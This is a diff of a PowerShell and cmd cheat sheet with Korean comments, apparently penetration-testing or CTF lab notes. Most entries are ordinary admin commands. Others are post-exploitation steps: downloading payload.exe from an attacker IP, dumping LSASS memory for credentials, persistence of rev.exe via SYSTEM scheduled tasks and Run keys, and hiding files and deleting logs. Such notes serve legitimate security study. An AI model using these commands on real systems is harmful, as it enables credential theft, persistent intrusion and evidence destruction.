@@ -7,7 +7,7 @@ Get-ChildItem
 ls
 dir
 
-# 권한 확인
+## 권한 확인
 
 whoami /priv
 
@@ -33,7 +33,7 @@ rm
 Get-Alias
 Get-Command -Name Remove*
 
-# 이동 (디렉토리 탐색)
+## 이동 (디렉토리 탐색)
 
 - 해당 폴더로 이동
   cd C:\temp
@@ -68,20 +68,20 @@ Get-Command -Name Remove*
 - 절대경로로 변환
   Resolve-Path .\a.txt
 
-# check systeminfo
+## check systeminfo
 
 systeminfo
 Get-ComputerInfo
 Get-LocalUser
 
-# process
+## process
 
 Start-Process notepad.exe
 Stop-Process -Name notepad
 Get-Service
 Restart-Service 서비스명
 
-# network
+## network
 
 - 핑 확인
   Test-Connection google.com
@@ -89,7 +89,7 @@ Restart-Service 서비스명
 Get-NetIPAddress
 Get-NetTCPConnection
 
-# script
+## script
 
 - 스크립트 실행 정책 허용
   Set-ExecutionPolicy RemoteSigned
@@ -97,17 +97,17 @@ Get-NetTCPConnection
 - 스크립트 실행
   .\script.ps1
 
-# pipe
+## pipe
 
 Get-ChildItem | Sort-Object Length
 Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"
 
-# search
+## search
 
 Select-String -Path ".\package-lock.json" -Pattern "hat"
 Get-ChildItem | Where-Object -Property Length -gt 100
 
-# help
+## help
 
 Get-Help 명령어
 Get-Help New-LocalUser -examples
@@ -116,15 +116,15 @@ Get-Help New-LocalUser -examples
   Get-Content
   Set-Location
 
-# system
+## system
 
 Get-ComputerInfo
 
-# users
+## users
 
 Get-LocalUser
 
-# network
+## network
 
 Get-NetIPConfiguration
 Get-NetIPAddress
@@ -132,21 +132,21 @@ Get-NetIPAddress
 Get-Process
 Get-Service
 
-# netstat
+## netstat
 
 Get-NetTCPConnection
 
-# hash
+## hash
 
 Get-FileHash -Path .\ship-flag.txt
 
-# remote command
+## remote command
 
 Invoke-Command -ComputerName SERVER01 -ScriptBlock { Get-Process }
 Invoke-Command -ComputerName SERVER01, SERVER02 -ScriptBlock { hostname }
 Invoke-Command -ComputerName SERVER01 -Credential DOMAIN\User -ScriptBlock { Get-Service }
 
-# find flag / files
+## find flag / files
 
 Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue
 
@@ -157,7 +157,7 @@ findstr /s /i "flag" C:\*.txt 2>nul
 
 Get-ChildItem -Path C:\Users\*\Desktop -File
 
-# file move / manage
+## file move / manage
 
 - 파일 이동 / 이름 변경도 가능
   Move-Item -Path C:\temp\a.txt -Destination C:\temp\b.txt
@@ -182,7 +182,7 @@ Copy-Item -Path .\a.txt -Destination C:\temp\ -Force
 - 여러 파일 한 번에 이동
   Get-ChildItem C:\temp | Move-Item -Destination C:\temp\archive\
 
-# registry
+## registry
 
 - 서비스 시작 유형 전체 덤프 (약한 권한 서비스 탐색)
   Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\*\Start
@@ -202,7 +202,7 @@ Copy-Item -Path .\a.txt -Destination C:\temp\ -Force
 - 특정 키 값 조회
   reg query HKCU /v Password
 
-# services / scheduled task
+## services / scheduled task
 
 Get-Service | Where-Object Status -eq Running
 
@@ -219,7 +219,7 @@ Stop-Service -Name Spooler -Force
 - 1분마다 SYSTEM 권한으로 실행 (지속성/권한 상승)
   schtasks /create /tn svc /tr "C:\temp\rev.exe" /sc minute /mo 1 /ru SYSTEM
 
-# user / group
+## user / group
 
 Get-LocalUser
 
@@ -242,13 +242,13 @@ net group "Domain Admins" /domain
 
 whoami /groups
 
-# share
+## share
 
 Get-SmbShare
 
 net use \\localhost\IPC$ "" /user:Administrator ""
 
-# network
+## network
 
 - 특정 포트 열림 확인
   Test-NetConnection -ComputerName 192.168.192.65 -Port 445
@@ -268,7 +268,7 @@ net use \\localhost\IPC$ "" /user:Administrator ""
 - SMB 통신 대상 확인
   Get-NetTCPConnection | Where-Object RemotePort -eq 445
 
-# file transfer
+## file transfer
 
 - 페이로드 다운로드
   Invoke-WebRequest -Uri http://192.168.x.x/payload.exe -OutFile C:\temp\payload.exe
@@ -278,7 +278,7 @@ net use \\localhost\IPC$ "" /user:Administrator ""
 
 IWR http://192.168.x.x/payload.exe -OutFile .\payload.exe
 
-# hash / dump
+## hash / dump
 
 Get-FileHash -Algorithm MD5 .\payload.exe
 
@@ -287,7 +287,7 @@ certutil -hashfile .\payload.exe SHA256
 - LSASS 메모리 덤프 (자격 증명 탈취)
   procdump -ma lsass.exe C:\temp\lsass.dmp
 
-# env / system info
+## env / system info
 
 $env:USERNAME
 
@@ -301,7 +301,7 @@ $env:USERNAME
 
 systeminfo | findstr /i "OS Name"
 
-# recon
+## recon
 
 - 실행 프로세스 + 세션 사용자
   tasklist /v
@@ -336,7 +336,7 @@ systeminfo | findstr /i "OS Name"
 - 설치된 패치
   Get-HotFix
 
-# ACL / 권한
+## ACL / 권한
 
 - 파일 ACL 상세
   Get-Acl .\file.txt | Format-List
@@ -353,7 +353,7 @@ systeminfo | findstr /i "OS Name"
 - 상위 폴더 권한 확인
   (Get-Acl C:\Windows\System32).Access | Select-Object IdentityReference, FileSystemRights
 
-# AD 도메인
+## AD 도메인
 
 - 도메인 사용자 전체
   Get-ADUser -Filter * -Properties Name,SamAccountName
@@ -372,7 +372,7 @@ systeminfo | findstr /i "OS Name"
 
 net group "Domain Admins" /domain
 
-# 프로세스 실행 / 권한 상승
+## 프로세스 실행 / 권한 상승
 
 - UAC 프롬프트로 실행
   Start-Process -FilePath .\rev.exe -Verb RunAs
@@ -393,7 +393,7 @@ Start-Process -FilePath C:\temp\rev.exe -WindowStyle Hidden
 - PowerShell 설치 경로
   $pshome
 
-# 지속성 (추가)
+## 지속성 (추가)
 
 New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value "C:\temp\rev.exe" -PropertyType String -Force
 
@@ -408,7 +408,7 @@ New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Upd
 
 sc.exe create svc binPath= "C:\temp\svc.exe" start= auto
 
-# 파일 숨기기 / 흔적 제거
+## 파일 숨기기 / 흔적 제거
 
 - 숨김 속성
   attrib +h C:\temp\rev.exe
@@ -422,18 +422,18 @@ sc.exe create svc binPath= "C:\temp\svc.exe" start= auto
 - 파일/로그 삭제
   Remove-Item C:\temp\rev.exe, C:\temp\log.txt -Force -ErrorAction SilentlyContinue
 
-# NTFS ADS
+## NTFS ADS
 
 - alternate data stream 목록
   Get-Content C:\temp\rev.exe -Stream *
 
 Get-Item C:\temp\rev.exe -Stream *
 
-# grep
+## grep
 
 - `whoami /priv | findstr /i "SeDebug"`
 
-# SYSTEM 프로세스 찾기
+## SYSTEM 프로세스 찾기
 
 - `tasklist /v | findstr /i "system"`
 - `Get-Process lsass, winlogon -IncludeUserName`
